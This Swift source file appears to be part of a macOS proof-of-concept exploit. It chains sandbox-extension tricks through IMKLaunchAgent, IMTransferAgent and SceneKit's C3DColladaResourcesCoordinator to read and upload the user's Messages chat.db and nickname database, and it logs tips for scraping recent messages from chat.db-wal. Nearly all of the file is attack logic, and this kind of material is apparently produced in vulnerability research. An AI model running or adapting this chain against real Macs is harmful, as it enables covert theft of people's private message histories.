//
//  Primary.swift
//  inputcontrol
//
//  Created by Spotlight Deveaux on 2022-09-05.
//

import Foundation
import SwiftUI

enum RequestErrors: Error {
    case chatDBTooLarge
}

func attemptRequest() throws {
    // First, we'll need to obtain a Mach extension from IMKLaunchAgent
    // in order to connect to IMTransferAgent.
    // See these functions for their respective action.
    try obtainMachExtension(for: "com.apple.imtransferservices.IMTransferAgent", via: ExtensionTypes.koren)

    // IMTransferAgent, understandably, has a restrictive sandbox.
    //
    // So we'll upload an image, downloading it to
    // IMTransferAgent's cache directory (`siphonedFilePath`)...
    log(entry: "About to upload dummy PNG and obtain extension.")
    let dummyImagePath = try copyDummy()
    try uploadAndDownloadFile(sourcePath: dummyImagePath, encrypted: false)

    // ...and obtain it via C3DColladaResourcesCoordinator in SceneKit.
    // (C3DColladaResourcesCoordinator only allows issuing extensions for images.)
    try obtainFileExtension(for: siphonedFilePath())

    // We're now in a position to attempt to obtain the user's chat.db.
    // We're making a large assumption on the path, but it's usually right.
    // (Famous last words.)
    let homeDir = "/Users/\(NSUserName())"
    do {
        try uploadAndDownloadFile(sourcePath: "\(homeDir)/Library/Messages/chat.db")
        try queryChatDatabase()
    } catch let e as TransferError {
        // Let's see if this was due to the file being too large.
        guard e == TransferError.tooLarge else {
            throw e
        }
        log(entry: "Unfortunately, chat.db is too large to upload.")
        log(entry: "Please note chat.db-wal can be sufficient to scrape recent messages from the user.")
        log(entry: "\nProceeding with handledNicknamesKeyStore.db...")
    }

    // We'll also grab handled nicknames.
    try uploadAndDownloadFile(sourcePath: "/Users/spot/Library/Messages/NickNameCache/handledNicknamesKeyStore.db")
    try queryNicknameStore()

    log(entry: "Done!")
}

// Copies our dummy image from our bundle to our temporary directory.
//
// IMTransferAgent has read access to the entirety of DARWIN_USER_ROOT_DIR, per
// /System/Library/Sandbox/Profiles/com.apple.iMessage.shared.sb.
func copyDummy() throws -> String {
    let bundlePath = Bundle.main.url(forResource: "dummy", withExtension: "png")!
    let cachePath = try temporaryFile(named: "dummy.png")

    try FileManager.default.copyItem(at: bundlePath, to: cachePath)

    return cachePath.path()
}
